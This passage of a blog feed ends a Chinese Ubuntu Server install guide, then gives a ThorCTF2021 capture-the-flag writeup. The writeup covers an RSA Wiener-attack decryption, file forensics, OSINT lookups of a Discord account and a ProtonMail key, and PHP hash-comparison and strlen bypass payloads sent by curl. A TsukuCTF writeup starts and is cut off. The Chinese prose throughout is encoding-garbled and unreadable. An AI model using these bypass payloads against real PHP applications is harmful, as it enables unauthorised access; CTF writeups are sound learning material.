<li>è¿›å…¥å¦‚ä¸‹ç•Œé¢åï¼Œé€‰æ‹©&quot;Detect and mount CD-ROM(æ¢æµ‹å¹¶æŒ‚è½½å…‰ç›˜)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165919.jpg)</li>
<li>è¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œé€‰æ‹©&quot;Network interface(ç½‘ç»œæ¥å£)&quot;ï¼Œè¿™é‡Œé€‰æ‹©ç¬¬ä¸€ä¸ªç½‘ç»œæ¥å£ï¼Œç­‰å¾…å®‰è£…ç¨‹åºè‡ªåŠ¨å®Œæˆé…ç½®ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723165949.jpg)</li>
<li>è®¾ç½®&quot;Hostname(ä¸»æœºå)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170037.jpg)</li>
<li>è®¾ç½®&quot;Full name for the new user(æ–°ç”¨æˆ·çš„å…¨å)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170121.jpg)</li>
<li>è®¾ç½®&quot;Username for your account(ä½ è´¦å·çš„ç”¨æˆ·å)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170137.jpg)</li>
<li>è®¾ç½®&quot;password for the new user(æ–°ç”¨æˆ·çš„å¯†ç )&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170145.jpg)</li>
<li>å¦‚æœæ‰€è®¾ç½®çš„å¯†ç è¾ƒä¸ºç®€å•ï¼Œå¯èƒ½ä¼šå¼¹å‡ºå¦‚ä¸‹å¯¹è¯æ¡†ï¼Œè¯¢é—®ä½ æ˜¯å¦ä½¿ç”¨ä¸€ä¸ª&quot;weak password(å¼±å£ä»¤)&quot;ï¼Œé€‰æ‹©&quot;Yes(æ˜¯)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170157.jpg)</li>
<li>å‡ºç°å¦‚ä¸‹ç•Œé¢ï¼Œè¯¢é—®ä½ æ˜¯å¦&quot;Encrypt your home directory(åŠ å¯†ä½ çš„ä¸»ç›®å½•)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170208.jpg)</li>
<li>ç„¶åå¯èƒ½ä¼šå‡ºç°æ—¶åŒºè®¾ç½®é”™è¯¯ï¼Œé€‰æ‹© &quot;Continue(ç»§ç»­)&quot;,è¿›å…¥å¦‚ä¸‹ç•Œé¢ï¼Œé€‰æ‹©&quot;Install the system(å®‰è£…ç³»ç»Ÿ)&quot;,ç„¶åç›´æ¥å›è½¦ï¼Œé€‰æ‹©&quot;Partion disks(ç£ç›˜åˆ†åŒº)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170228.jpg)<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170234.jpg)</li>
<li>å‡ºç°ä¸‹å›¾ç•Œé¢ï¼Œè¯¢é—®ä½ æ˜¯å¦&quot;Umount partitions that are in use(å¸è½½æ­£åœ¨ä½¿ç”¨çš„åˆ†åŒº)&quot;ï¼Œé€‰æ‹©&quot;Yes(æ˜¯)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170255.jpg)</li>
<li>é€‰æ‹©&quot;Partitioning method(åˆ†åŒºæ–¹æ³•)&quot;ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©&quot;Guided - use entire disk and set up LVM(ä½¿ç”¨æ•´ä¸ªç£ç›˜å¹¶é…ç½®LVM)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170318.jpg)</li>
<li>&quot;Select disk to partition(é€‰æ‹©è¦åˆ†åŒºçš„ç£ç›˜)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170325.jpg)</li>
<li>é€‰æ‹©&quot;Partitioning Scheme(åˆ†åŒºæ–¹æ¡ˆ) &quot;ï¼Œè¿™é‡Œæ¨èé€‰æ‹©&quot;All files in one partition(æ‰€æœ‰æ–‡ä»¶æ”¾åœ¨åŒä¸€åˆ†åŒº)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170331.jpg)</li>
<li>å‡ºç°å¦‚ä¸‹ç•Œé¢ï¼Œè¯¢é—®ä½ æ˜¯å¦&quot;Write the changes to disks and configure LVM(å°†ä¿®æ”¹å†™å…¥ç£ç›˜å¹¶é…ç½®LVM)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170342.jpg)</li>
<li>è®¾ç½®&quot;Name of the volume group for the new system(æ–°ç³»ç»Ÿçš„å·ç»„å)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170359.jpg)</li>
<li>è®¾ç½®&quot;Amount of volume group to use for guided partitioning(ç”¨äºåˆ†åŒºå¼•å¯¼çš„å·ç»„æ•°)&quot;ï¼Œé»˜è®¤å¤§å°å³å¯ï¼Œæ— éœ€ä¿®æ”¹ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170421.jpg)</li>
<li>å‡ºç°ä¸‹å›¾ç•Œé¢ï¼Œè¯¢é—®ä½ æ˜¯å¦&quot;Umount partitions that are in use(å¸è½½æ­£åœ¨ä½¿ç”¨çš„åˆ†åŒº)&quot;ï¼Œé€‰æ‹©&quot;Yes(æ˜¯)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170434.jpg)</li>
<li>å‡ºç°å¦‚ä¸‹ç•Œé¢ï¼Œè¯¢é—®ä½ æ˜¯å¦&quot;Force UEFI installation(å¼ºåˆ¶UEFIå®‰è£…)&quot;ï¼Œé€‰æ‹©&quot;Yes(æ˜¯)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170442.jpg)</li>
<li>å‡ºç°å¦‚ä¸‹ç•Œé¢ï¼Œè¯¢é—®æ˜¯å¦&quot;Write the changes to disks(å°†æ”¹åŠ¨å†™å…¥ç£ç›˜)&quot;ï¼Œé€‰æ‹©&quot;Yes(æ˜¯)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170452.jpg)</li>
<li>&quot;Kernel to install(è¦å®‰è£…çš„å†…æ ¸)&quot;,é€‰æ‹©é»˜è®¤çš„&quot;Linux-generic&quot;å³å¯ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170544.jpg)</li>
<li>å›è½¦åå‡ºç°å¦‚ä¸‹ç•Œé¢ï¼Œè¿™é‡Œè¦é€‰æ‹©åŒ…å«åœ¨initrdä¸­çš„é©±åŠ¨ç¨‹åºï¼Œé€‰æ‹©é»˜è®¤çš„&quot;generic:include all available drivers(é€šç”¨:åŒ…å«æ‰€æœ‰å¯ç”¨çš„é©±åŠ¨ç¨‹åº)&quot;å³å¯ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170555.jpg)</li>
<li>&quot;HTTP proxy information(HTTPä»£ç†ä¿¡æ¯)&quot;ä¸å†™ï¼Œç›´æ¥å›è½¦å³å¯ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170657.jpg)</li>
<li>è¯¢é—®ä½ ç®¡ç†ç³»ç»Ÿæ›´æ–°çš„æ–¹å¼ï¼Œé€‰æ‹©&quot;No automatic updates(ä¸è‡ªåŠ¨æ›´æ–°)&quot;ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170737.jpg)</li>
<li>&quot;Choose software to install(é€‰æ‹©è¦å®‰è£…çš„è½¯ä»¶)&quot;ï¼Œå»ºè®®å‹¾é€‰ä¸Š&quot;OpenSSh server&quot;ï¼Œç„¶åå›è½¦;<br>é€‰æ‹©æ–¹æ³•ä¸º:é€šè¿‡é”®ç›˜ä¸Šä¸‹é”®ç§»åŠ¨å…‰æ ‡è‡³é€‰è¦æ‹©é¡¹ï¼Œåœ¨è¦é€‰æ‹©çš„é¡¹ä¸ŠæŒ‰ç©ºæ ¼å³å¯ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180724154325.jpg)</li>
<li>å›è½¦åï¼Œæ˜¾ç¤ºå®‰è£…å®Œæˆï¼Œç»§ç»­å›è½¦ï¼Œé‡å¯ç³»ç»Ÿï¼Œæ­¤æ—¶å°±å¯ä»¥æ‹”æ‰Uç›˜ï¼›<br>![](&#x2F;images&#x2F;Ubuntu Server 16.04&#x2F;IMG20180723170940.jpg)</li>
<li>é‡å¯åï¼Œå†æ¬¡è¿›å…¥TDMï¼Œå°†&quot;Boot Mode(å¼•å¯¼æ¨¡å¼)&quot;æ”¹ä¸º&quot;Legacyã€€Only(ä»…Legacyæ¨¡å¼)&quot;ï¼Œå¦åˆ™æœ‰å¯èƒ½å‡ºç°ä¸èƒ½è¿›å…¥Linuxç³»ç»Ÿçš„æƒ…å†µï¼›</li>
</ol>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>ThorCTF2021 Writeup</title>
    <url>/posts/1756116899/</url>
    <content><![CDATA[<h1 id="Shingeki-no-RSA"><a href="#Shingeki-no-RSA" class="headerlink" title="Shingeki no RSA"></a>Shingeki no RSA</h1><p><em>One encryption, three params, you know what to do.</em></p>
<p><a href="https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing">https://drive.google.com/file/d/1xbwFfAHu5OWbkEV3QlYGP59nHXpv57WT/view?usp=sharing</a></p>
<hr>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ª<code>out.txt</code>,é‡Œé¢åŒ…å«<code>n</code>,<code>e</code>,<code>c</code>çš„å€¼</p>
<p>ä½¿ç”¨<a href="https://github.com/pablocelayes/rsa-wiener-attack">rsa-wiener-attack</a>ç ´è§£å¾—åˆ°dçš„å€¼</p>
<pre><code class="shell">~$ python RSAwienerHacker.py
Hacked!
50954488565980029757584514143249292352586758895690937600871123296191815851393
</code></pre>
<p>ä»£ç :</p>
<pre><code class="python">from Crypto.Util.number import long_to_bytes
import gmpy2
e = 573539981054118375159951884901136205381955275096471242113613923667834312363548126598981740314307696033323138227176735824259098674326069670063001503892366653022633390483272968412233602239104757299239510751275655288670147128536527296060843927282827574422039154045360669647002461865276005609405093376965933104257
n = 666012509503758414438426745752029036046328310944346357068259451859585174290580664150188141697939659811599336002592599704089746160399428670863696780761420173279676565150259812749267725206078003773597631925996185977321417456827136083352043009732414371490356153874019687554196902819696964658218055292422529903061
c = 208271638964220806986932660131544686073844142913497222151993342727885811478884727510239109595118929917803309949401762080874858518281133929171859315997601484068462684780596513932104673255797873067799046024798017005908221308124294210078684387266545107254593378287958436606968619452939117043031695740389528821956
d = 50954488565980029757584514143249292352586758895690937600871123296191815851393
m = gmpy2.powmod(c, d, n)
print(long_to_bytes(m))
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;d1d_y0u_us3_w13n3r&#39;s?&#125;</code></p>
<h1 id="Happy-Flag"><a href="#Happy-Flag" class="headerlink" title="Happy Flag"></a>Happy Flag</h1><p><em>We have many flags. But we need a good flag!</em></p>
<p><a href="https://drive.google.com/file/d/1194sBi8Ijb4C-cYDGP2qZvXgj9uxSe7R/view?usp=sharing">https://drive.google.com/file/d/1194sBi8Ijb4C-cYDGP2qZvXgj9uxSe7R/view?usp=sharing</a></p>
<hr>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªæ–‡ä»¶<code>world_flags.zeep</code>,<code>file</code>åå‘ç°æ˜¯ä¸€ä¸ªzipå‹ç¼©æ–‡ä»¶,ä½¿ç”¨<code>unzip</code>è§£å‹.</p>
<p>è§£å‹åå‘ç°æœ‰</p>
<pre><code class="shell">~$ file world_flags.zeep
world_flags.zeep: Zip archive data, at least v1.0 to extract
~$ unzip world_flags.zeep
Archive:  world_flags.zeep
   creating: world_flags/
  inflating: world_flags/1.txt       
  inflating: world_flags/10.txt      
  inflating: world_flags/100.txt     
  inflating: world_flags/1000.txt    
  inflating: world_flags/10000.txt   
  inflating: world_flags/10001.txt
  ....
</code></pre>
<p>ç›´æ¥<code>cat</code>æ‰€æœ‰æ–‡ä»¶,ç„¶åç”¨<code>uniq</code>å»é‡</p>
<pre><code class="shell">~$ cat *.txt | uniq
SBGTF&#123;false_flag_ğŸ¥º&#125; 
SBCTF&#123;Cool_flag_!!!&#125;
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;Cool_flag_!!!&#125;</code></p>
<h1 id="Query-The-Flag"><a href="#Query-The-Flag" class="headerlink" title="Query The Flag"></a>Query The Flag</h1><p><em>Query the flag</em></p>
<p><em><a href="https://drive.google.com/file/d/1pwr09e-BoNoJujrJJ_hlAuhEGgJnsb6V/view?usp=sharing">https://drive.google.com/file/d/1pwr09e-BoNoJujrJJ_hlAuhEGgJnsb6V/view?usp=sharing</a></em></p>
<hr>
<p>é¢˜ç›®ç»™äº†ä¸€ä¸ªSQLiteçš„æ•°æ®åº“æ–‡ä»¶,ç›´æ¥grep</p>
<pre><code class="shell">~$ strings find.db | grep SBCTF                           
SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125;NULL
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;I_w@s_s0_sl33py_D3s1gn1ng_7h1s&#125;</code></p>
<h1 id="they-all-look-the-same"><a href="#they-all-look-the-same" class="headerlink" title="they all look the same"></a>they all look the same</h1><p><em>They are slightly different</em></p>
<p><a href="https://drive.google.com/file/d/1XjkSCEjydggD7FHaWsBxKYTrivyesd1M/view?usp=sharing">https://drive.google.com/file/d/1XjkSCEjydggD7FHaWsBxKYTrivyesd1M/view?usp=sharing</a></p>
<hr>
<p>è§£å‹ä¸‹è½½çš„zipæ–‡ä»¶,å‘ç°é‡Œé¢ä¸€å †jpgæ–‡ä»¶,é¦–å…ˆçœ‹çœ‹md5å€¼</p>
<pre><code class="shell">~$ md5 *
MD5 (images - Copy (1).jpg) = b69410fdc3f11fbac6bb3e32e40df1de
MD5 (images - Copy (10).jpg) = 1aa6e81b2335fdee91492125d4352503
MD5 (images - Copy (100).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
MD5 (images - Copy (101).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
MD5 (images - Copy (102).jpg) = 592434721909e841870ba0cfc0bce6aa
MD5 (images - Copy (103).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
MD5 (images - Copy (104).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
MD5 (images - Copy (105).jpg) = 58d55ebd6b5b7717ec7188af4f4bef66
</code></pre>
<p>ç„¶åç”¨<code>exiftool</code>æŸ¥çœ‹æ–‡ä»¶çš„å…ƒæ•°æ®è¯•è¯•</p>
<pre><code class="shell">~$ exiftool images\ -\ Copy\ \(1\).jpg
ExifTool Version Number         : 12.31
File Name                       : images - Copy (1).jpg
Directory                       : .
File Size                       : 16 KiB
File Modification Date/Time     : 2021:11:21 00:21:28+08:00
File Access Date/Time           : 2021:12:10 09:32:26+08:00
File Inode Change Date/Time     : 2021:12:10 09:32:26+08:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : inches
X Resolution                    : 96
Y Resolution                    : 96
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : S
XP Title                        : S
Padding                         : (Binary data 2060 bytes, use -b option to extract)
About                           : uuid:faf5bdd5-ba3d-11da-ad31-d33d75182f1b
Title                           : S
Description                     : S
Image Width                     : 376
Image Height                    : 134
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 376x134
Megapixels                      : 0.050
</code></pre>
<p>å‘ç°<code>Image Description</code>é‡Œæœ‰ä¸€ä¸ªS,é¡ºåºæ‰“å°ä¸€ä¸‹æ‰€æœ‰æ–‡ä»¶çš„<code>Image Description</code>è¯•è¯•</p>
<pre><code class="shell">~$ for i in `seq 1 153`;do exiftool images\ -\ Copy\ \($&#123;i&#125;\).jpg| grep &quot;Image Description&quot;;done
Image Description               : S
Image Description               : B
Image Description               : C
Image Description               : T
Image Description               : F
Image Description               : &#123;
Image Description               : H
Image Description               : 0
Image Description               : w
....

~$ cat tmp |  awk &#39;&#123;print $4&#125;&#39; | xargs echo
S B C T F &#123; H 0 w _ c 0 u l d _ y 0 u _ d ! s t ! n g u ! s h S _ S S S ! S S S m S S S @ S S S g S S S 3 S S S s S S S _ S S S
</code></pre>
<p>ç»“å°¾ä¼¼ä¹æœ‰ä¸€äº›å¤šä½™çš„S,å»æ‰åå³å¯å¾—åˆ°flag</p>
<p><strong>flag:</strong><code>SBCTF&#123;H0w_c0uld_y0u_d!st!ngu!sh_!m@g3s_&#125;</code></p>
<h1 id="Discord"><a href="#Discord" class="headerlink" title="Discord"></a>Discord</h1><p><em>Find the account creation date of one of our discord channel admins (4dam).</em></p>
<p><em>Note: Please put the date in this format YYYY&#x2F;MM&#x2F;DD for submission, like this: SBCTF{1970&#x2F;01&#x2F;01}</em></p>
<hr>
<p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬æ‰¾åˆ°ç®¡ç†å‘˜<code>4dam</code>åˆ›å»ºè´¦å·çš„æ—¶é—´.</p>
<p>é¦–å…ˆæ‰“å¼€Discord-&gt;:gear:-&gt;é«˜çº§è®¾ç½®,æ‰“å¼€â€œå¼€å‘è€…æ¨¡å¼â€</p>
<p><img data-src="/../../CTF/ThorCTF2021/Osint/images/image-20211209130044097.png" alt="image-20211209130044097"></p>
<p>å¯¹ç€å¤´åƒå³é”®,å¤åˆ¶ID(<code>808684903301775360</code>)</p>
<p><img data-src="/../../CTF/ThorCTF2021/Osint/images/image-20211209130410067.png" alt="image-20211209130410067"></p>
<p>æ‰“å¼€<a href="https://snowsta.mp/?l=zh-cn&z=5&f=ht4idgkcy7-11s">https://snowsta.mp</a>,è¾“å…¥IDæŸ¥è¯¢</p>
<p><img data-src="/../../CTF/ThorCTF2021/Osint/images/image-20211209131027396.png" alt="image-20211209131027396"></p>
<p><strong>flag:</strong><code>SBCTF&#123;2020/02/09&#125;</code></p>
<h1 id="Email-Hunt"><a href="#Email-Hunt" class="headerlink" title="Email Hunt"></a>Email Hunt</h1><p><em>I want to find the PGP Public Key of someone&#39;s ProtonMail account, but all I got is a useless document he shared with me (<a href="https://docs.google.com/spreadsheets/d/1iBRs347v5xXICdgHm4-sQBEFozbqhTABPIespxSBI20">https://docs.google.com/spreadsheets/d/1iBRs347v5xXICdgHm4-sQBEFozbqhTABPIespxSBI20</a>).</em><br><em>Can you help me find it?</em></p>
<p><em>Note: Please submit the flag like this example:</em></p>
<pre><code class="asciiarmor">-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: ProtonMail

aBBBBBBBBBBBBBBBB
BBBBBBBBBBBBBBBBB
BBBBYz
-----END PGP PUBLIC KEY BLOCK-----
</code></pre>
<p><em>Flag: SBCTF{aBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBYz}</em></p>
<hr>
<p>è®¿é—®é¢˜ç›®ä¸­ç»™å‡ºçš„Googleè¡¨æ ¼çš„é“¾æ¥.</p>
<p>ç„¶åè®¿é—®<a href="https://docs.google.com/spreadsheets/u/0/">https://docs.google.com/spreadsheets/u/0/</a>æŸ¥çœ‹æœ€è¿‘è®¿é—®çš„è¡¨æ ¼æ–‡ä»¶,å¹¶ç”¨F12æŠ“åŒ…</p>
<p><img data-src="/../../CTF/ThorCTF2021/Osint/images/image-20211208101433762.png" alt="image-20211208101433762"></p>
<p>æ‰¾åˆ°Gmailé‚®ç®±<code>priv4te3mail0fmr.8@gmail.com</code></p>
<p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬æ‰¾åˆ°ProtonMailè´¦å·çš„PGPå…¬é’¥,çŒœæµ‹é‚®ç®±å‰ç¼€å¯èƒ½ä¸€æ ·,å³<code>priv4te3mail0fmr.8@protonmail.com</code></p>
<p>å‚ç…§<a href="https://protonmail.com/support/knowledge-base/download-public-private-key/">https://protonmail.com/support/knowledge-base/download-public-private-key/</a>,ä¸‹è½½PGPå…¬é’¥</p>
<pre><code class="shell">~$ wget https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com
--2021-12-08 10:43:59--  https://api.protonmail.ch/pks/lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com
æ­£åœ¨è§£æä¸»æœº api.protonmail.ch (api.protonmail.ch)... 185.70.42.25
æ­£åœ¨è¿æ¥ api.protonmail.ch (api.protonmail.ch)|185.70.42.25|:443... å·²è¿æ¥ã€‚
å·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK
é•¿åº¦ï¼š709 [application/pgp-keys]
æ­£åœ¨ä¿å­˜è‡³: â€œlookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.comâ€

lookup?op=get&amp;search=priv4te3mail0fmr 100%[========================================================================&gt;]     709  --.-KB/s  ç”¨æ—¶ 0s

2021-12-08 10:44:00 (225 MB/s) - å·²ä¿å­˜ â€œlookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.comâ€ [709/709])
~$ cat lookup?op=get&amp;search=priv4te3mail0fmr.8@protonmail.com
-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: ProtonMail

xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoU
bjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8
cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJh
lwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRS
LQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/
AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrO
OARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs
8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRS
LQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV
8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8=
=E+gi
-----END PGP PUBLIC KEY BLOCK-----
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;xjMEYZcIIhYJKwYBBAHaRw8BAQdAgXzkYJTBPtkxMSemLogafK1ryTzAsPoUbjT8hQ6Wc4XNRXByaXY0dGUzbWFpbDBmbXIuOEBwcm90b25tYWlsLmNvbSA8cHJpdjR0ZTNtYWlsMGZtci44QHByb3Rvbm1haWwuY29tPsKPBBAWCgAgBQJhlwgiBgsJBwgDAgQVCAoCBBYCAQACGQECGwMCHgEAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7cgCtAP0dhlLk+UMY9FBnN/SiR+nIObn0q4f/AS2k8kRvuA9cQgEA13kb1fTDmIGXp/rkTh9MSUt22m6rF5khiOr9yCYoTQrOOARhlwgiEgorBgEEAZdVAQUBAQdARRDPDTZcD3gJkaXMzYOSGcLSY0M8PEMs8w0eI9ydnxcDAQgHwngEGBYIAAkFAmGXCCICGwwAIQkQBcfjCjlf+3IWIQRSLQS+kFOUoSEmSs4Fx+MKOV/7ckoLAQCjmVOWyFLflAz5dCinOZI0G8yOsduV8PSw2hvTeyiZMwEAkl9U2tmg2i/XW5PckxqvNgxAZZkkEoQPWa6UpKICIw8==E+gi&#125;</code></p>
<h1 id="Tricks-1"><a href="#Tricks-1" class="headerlink" title="Tricks 1"></a>Tricks 1</h1><p><em>A couple of PHP Tricks, give it a try.</em></p>
<hr>
<pre><code class="php"> &lt;?php
    error_reporting(0);

    if (isset($_GET[&quot;a&quot;]) &amp;&amp; isset($_GET[&quot;b&quot;])) &#123;
        if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; sha1($_GET[&quot;a&quot;]) === sha1($_GET[&quot;b&quot;])) &#123;
            if ($_GET[&quot;a&quot;] !== $_GET[&quot;b&quot;] &amp;&amp; md5($_GET[&quot;a&quot;]) === md5($_GET[&quot;b&quot;])) &#123;
                $flag = file_get_contents(&quot;../../flag&quot;);
                echo $flag;
            &#125;else &#123;
                echo &quot;Didn&#39;t get passed MD5.&quot;;
            &#125;
        &#125;else &#123;
            echo &quot;Didn&#39;t get passed SHA1.&quot;;
        &#125;
    &#125;else &#123;
        highlight_file(__FILE__);
        die();
    &#125;
?&gt; 
</code></pre>
<p><code>md5</code>å’Œ<code>sha1	</code>ä¸èƒ½ç”¨æ¥å¤„ç†æ•°ç»„,<code>md5(arr)</code>å’Œ<code>sha1(arr)</code>ä¼šè¿”å›null</p>
<p><strong>payload</strong>: <code>a[]=a&amp;b[]=b</code></p>
<pre><code class="shell">~$ curl &quot;https://ch5.sbug.se/?a[]=a&amp;b[]=b&quot;
SBCTF&#123;g07_2_w17h_0n3_SH07?&#125;
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;g07_2_w17h_0n3_SH07?&#125;</code></p>
<h1 id="Tricks-2"><a href="#Tricks-2" class="headerlink" title="Tricks 2"></a>Tricks 2</h1><p><em>Another  round of PHP Tricks, good luck.</em></p>
<hr>
<pre><code class="php">&lt;?php error_reporting(0);
if (isset($_GET[&#39;a&#39;]) &amp;&amp; isset($_GET[&#39;b&#39;])) &#123;
    if (  strlen($_GET[&#39;a&#39;]) &gt;  mb_strlen($_GET[&#39;b&#39;], base64_decode(&#39;dXRmOA==&#39;) )) &#123;
        if (strlen($_GET[&#39;b&#39;]) &gt; mb_strlen($_GET[&#39;a&#39;], base64_decode(&#39;dXRmOA==&#39;))) &#123;
            $u327a6c4304ad5938 = file_get_contents(base64_decode(&#39;Li4vLi4vZmxhZw==&#39;));
            echo $u327a6c4304ad5938;
        &#125; else &#123;
            echo base64_decode(&#39;QWxyaWdodC4=&#39;);
        &#125;
    &#125; else &#123;
        echo base64_decode(&#39;VHJ5IGhhcmRlci4=&#39;);
    &#125;
&#125; else &#123;
    highlight_file(__FILE__);
    die();
&#125; ?&gt;
</code></pre>
<p><a href="https://www.php.net/manual/zh/function.strlen.php">strlen</a>è¿”å›çš„æ˜¯å­—ç¬¦ä¸²çš„å­—èŠ‚æ•°ï¼Œè€Œä¸æ˜¯å…¶ä¸­å­—ç¬¦çš„æ•°é‡.</p>
<p><a href="https://www.php.net/manual/zh/function.mb-strlen.php">mb-strlen</a> ç”¨æ¥è·å–å­—ç¬¦ä¸²çš„é•¿åº¦,å¤šå­—èŠ‚çš„å­—ç¬¦è¢«è®¡ä¸º1.</p>
<p>å› æ­¤è¿™é‡Œç”¨å¤šå­—èŠ‚å­—ç¬¦ä½œä¸ºå‚æ•°å³å¯</p>
<p><strong>payload</strong>: <code>a=å¤§&amp;b=å¤§</code></p>
<pre><code class="shell">$ curl &quot;https://ch6.sbug.se/?a=å¤§&amp;b=å¤§&quot;
SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;
</code></pre>
<p><strong>flag:</strong><code>SBCTF&#123;d1d_y0u_kn0w_abou7_7h47?&#125;</code></p>
<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
  </entry>
  <entry>
    <title>TsukuCTF2021 Writeup</title>
    <url>/posts/434189373/</url>
    <content><![CDATA[<h1 id="CrackSSH"><a href="#CrackSSH" class="headerlink" title="CrackSSH!"></a>CrackSSH!</h1><p><em>èª¿æŸ»å¯¾è±¡ã®ã‚µãƒ¼ãƒãƒ¼ã§ä½¿ã‚ã‚Œã¦ã„ã‚‹å…¬é–‹éµã‚’å…¥æ‰‹ã—ãŸã€‚å™‚ã«ã‚ˆã‚‹ã¨ã€ã“ã®éµã«ã¯å•é¡ŒãŒã‚ã‚‹ã‚‰ã—ã„ãŒ...ã€‚ãªã‚“ã¨ã‹ã—ã¦ä¾µå…¥ã—ãªã‘ã‚Œã°ã€‚</em><br><em>Target: frt.hongo.wide.ad.jp</em><br><em>Port: 30022</em></p>
<hr>
<p>é¢˜ç›®ä¸­ç»™äº†ä¸€ä¸ªå…¬é’¥:</p>
